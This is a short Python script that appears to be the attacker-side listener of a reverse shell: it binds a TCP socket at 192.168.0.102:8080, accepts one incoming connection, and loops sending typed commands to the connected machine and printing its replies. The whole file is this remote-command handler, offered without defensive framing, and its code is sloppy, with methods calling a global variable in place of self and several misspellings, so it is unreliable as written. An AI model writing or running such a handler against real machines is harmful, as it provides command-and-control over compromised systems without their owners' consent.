import socket



class back:
    '''Create a Class..!'''

    def __init__(self, ip, ports):
        '''this is a function'''
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, ports))
        listener.listen(0)
        print("[+] Wating for incoming Connections")
        self.connected, addres = listener.accept()
        print("[+] Get a Connection" + str(addres))


    def send_client(self, data):
        listenr.connected.send(data)


    def reciv_data(self):
        return listenr.connected.recv(1024).decode("UTF-8")


    def remote_control(self, command):
        self.send_client(command)
        return self.reciv_data()
    

    def run(self):
        '''all function run if while True'''
        while True:
            cmd = input(">>")

            result = self.remote_control(cmd)
            print(result)   



listenr = back("192.168.0.102", 8080)
listenr.run()

